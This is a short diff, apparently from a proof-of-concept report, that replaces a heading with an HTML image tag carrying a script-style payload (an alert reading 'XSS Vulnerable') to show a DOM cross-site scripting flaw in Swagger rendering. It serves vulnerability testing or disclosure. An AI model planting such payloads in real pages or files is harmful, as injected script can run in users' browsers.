@@ -1,4 +1,4 @@
-# hello2<>'"hello2
+# <img src="&{alert('XSS Vulnerable')};"> 
 this is PoC for swagger DOM Xss :)
     <title>hi<>'"hello</title>
 
